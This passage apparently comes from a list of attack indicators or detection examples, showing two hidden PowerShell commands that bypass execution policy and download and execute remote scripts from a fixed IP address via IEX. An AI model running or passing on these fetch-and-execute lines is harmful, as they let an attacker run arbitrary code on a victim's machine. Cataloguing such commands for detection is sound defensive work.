...
# Remote Script Retrieval and Execution Block
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; IEX ((New-Object Net.WebClient).DownloadString('http://206.71.149.194/parallel/ppnteconf.txt1'))

# Remote Script Retrieval and Execution Block
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c [Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; IEX ((New-Object Net.WebClient).DownloadString('http://206.71.149.194/cd'))
